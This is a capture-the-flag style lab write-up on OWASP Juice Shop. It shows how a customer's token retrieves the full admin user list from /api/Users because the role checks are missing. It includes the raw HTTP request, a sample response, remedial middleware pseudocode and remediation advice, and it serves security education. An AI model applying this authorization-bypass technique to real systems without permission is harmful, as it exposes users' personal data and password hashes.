# Lab Writeup 2: Unauthorized Administrative User List Exposure

**Category:** Broken Function Level Authorization (BFLA)
**Difficulty:** Beginner
**Date Completed:** 29/03/2026
**Platform:** OWASP Juice Shop
**Lab URL:** http://localhost:3000

---

## 1. Objective

Exploit a broken function-level authorization mechanism to bypass Role-Based Access Controls (RBAC) and successfully query the restricted administrative user directory as a standard customer. 

---

## 2. Vulnerability Overview

**Vulnerability Name:** Broken Function Level Authorization (BFLA)

**CWE Reference:** CWE-285: Improper Authorization

**OWASP Category:** API5:2023 – Broken Function Level Authorization

**What is this vulnerability?**

BFLA occurs when an application restricts access to UI elements (like hiding the Admin Panel from regular users) but fails to implement robust permission checks at the API/server backend. In this case, the `/api/Users` endpoint freely returns the complete user database array to any client providing a valid JWT, regardless of whether that JWT belongs to an Administrator or a Customer.

---

## 3. Reconnaissance & Discovery

During the enumeration phase, I focused on identifying backend API surfaces that might map to administrative functionalities:

**Endpoint Discovery:**
- Navigated through the bundled JavaScript files for hidden paths.
- Located references to `/Administration` and `/api/Users`.
- Discovered that the UI actively prevents regular users from rendering the Admin component. 

**The "Aha!" Moment:**
I knew from experience that UI hiding is not a security measure. I wondered: *Will the backend API enforce the same rules the frontend UI does?* I decided to directly call the API endpoint using my low-privileged token.

**Tool(s) Used:** Burp Suite Community Edition, DevTools

---

## 4. Exploitation Steps

### Step 1: Login as Standard Customer

I registered and logged in as a normal, unprivileged user to obtain a standard Bearer token.

### Step 2: Formulate the API Request

Without relying on the UI, I crafted a custom `GET` request to the target administrative API endpoint directly in Burp Repeater, attaching my low-privileged token.

**Request:**
```http
GET /api/Users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json, text/plain, */*
Authorization: Bearer [STANDARD_CUSTOMER_TOKEN]
Accept-Language: en-US,en;q=0.9
Connection: close
```

### Step 3: Forward the Request and Analyze

I forwarded the request to the server:

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 1045
Connection: close

{
  "status": "success",
  "data": [
    {
      "id": 1,
      "email": "admin@juice-sh.op",
      "password": "hashed_password_string_here",
      "role": "admin",
      "deluxeToken": "",
      "lastLoginIp": "127.0.0.1",
      "profileImage": "default.svg"
    },
    {
      "id": 2,
      "email": "customer@juice-sh.op",
      "password": "hashed_password_string_here",
      "role": "customer",
      "deluxeToken": "",
      "lastLoginIp": "127.0.0.1",
      "profileImage": "default.svg"
    }
  ]
}
```

**Success!** The backend returned a `200 OK` with the complete database registry of every user, including their emails, hashed passwords, and assigned privilege roles.

---

## 5. Root Cause Analysis

The flaw originates from the backend service lacking middleware verification for Role-Based Access Control (RBAC).

**What the API Does:**
1. ✅ Checks for a valid token (Authentication).
2. ❌ **FAILS** to verify if the token contains administrative claims before executing the database query.

**What the API Should Do:**
The route should be guarded by an authorization middleware that validates user roles:
```javascript
// Pseudocode - What's Missing
function isAdminMiddleware(req, res, next) {
    if (req.user.role !== 'admin') {
        return res.status(403).json("Forbidden: Admin access required");
    }
    next();
}

app.get('/api/Users', isAuthenticated, isAdminMiddleware, userController.getAll);
```

---

## 6. Impact

- [x] Privilege Escalation (vertical)
- [x] Mass PII Data Leakage

**Severity:** High

**Justification:** Access to the user database exposes sensitive emails and hashed passwords. An attacker can use this data to perform offline password-cracking attacks against the administrator's hash, leading to full system compromise. 

---

## 7. Remediation

1. **Backend Role Validation:** Implement a strict RBAC (Role-Based Access Control) matrix. Enforce role-validation middleware on all administrative endpoints.
2. **Deny-by-Default:** Ensure API endpoints deny access by default unless explicitly configured with specific required roles.
3. **Data Minimization:** Even when accessed legitimately by an admin, endpoints should automatically strip out unnecessary sensitive fields like hashed passwords before serving JSON payloads to the frontend.

---

## 8. Key Takeaways / What I Learned

- **UI Hiding is NOT Security:** Just because a link or a button isn't visible on the screen doesn't mean an attacker cannot interact with the underlying API. Security must be enforced on the server side.
- **Vertical Escalation is Fatal:** BFLA heavily impacts the core security model of administrative functions.
